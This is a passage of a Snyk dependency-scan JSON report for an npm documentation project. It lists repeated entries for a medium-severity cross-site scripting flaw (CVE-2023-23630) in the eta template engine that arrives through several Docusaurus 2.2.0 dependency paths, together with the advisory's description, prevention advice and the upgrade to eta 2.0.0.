      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-pages@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-classic@2.3.1",
        "@docusaurus/plugin-content-pages@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-classic@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-blog@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-search-algolia@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-blog@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-classic@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-docs@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-search-algolia@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-docs@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
